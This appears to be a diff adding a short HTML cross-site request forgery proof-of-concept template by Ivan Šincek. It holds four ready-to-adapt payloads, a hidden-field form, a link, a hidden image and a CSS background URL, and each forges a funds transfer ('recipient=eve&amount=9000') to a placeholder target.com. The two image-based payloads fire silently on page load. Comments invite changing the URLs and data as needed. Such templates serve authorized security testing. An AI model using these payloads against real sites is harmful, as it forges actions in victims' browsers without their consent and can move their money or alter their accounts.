@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<title>Simple CSRF</title>
+		<meta name="author" content="Ivan Šincek">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<style>
+			pre {
+				white-space: pre-wrap;
+			}
+		</style>
+	</head>
+	<body>
+		<!-- change the URLs, HTTP methods, and data as necessary -->
+		<!-- requests/responses are all on their own (individual) -->
+		<!-- for results, refer to console log -->
+		<!-- ---------------------------------------- -->
+		<!-- below examples are visible to the user and will redirect the user to a new page -->
+		<!-- -- -- --  --  --  --  --  --  --  --  -- -->
+		<!-- Burp Suite like CSRF PoC -->
+		<script>history.pushState('', '', '/');</script>
+		<form method="post" action="http://target.com">
+			<input name="recipient" type="hidden" value="eve">
+			<input name="amount" type="hidden" value="9000">
+			<input type="submit" value="Submit Request">
+		</form>
+		<!-- -- -- --  --  --  --  --  --  --  --  -- -->
+		<a href="http://target.com?recipient=eve&amount=9000">Click Me</a>
+		<!-- ---------------------------------------- -->
+		<!-- below examples are invisible to the user and will not redirect the user to a new page -->
+		<!-- -- -- --  --  --  --  --  --  --  --  -- -->
+		<img src="https://target.com/transfer.php?recipient=eve&amount=9000" alt="csrf" hidden="hidden">
+		<!-- -- -- --  --  --  --  --  --  --  --  -- -->
+		<img src="https://github.com/favicon.ico" alt="csrf" style="background-image: url('https://target.com/transfer.php?recipient=eve&amount=9000');" hidden="hidden">
+	</body>
+</html>
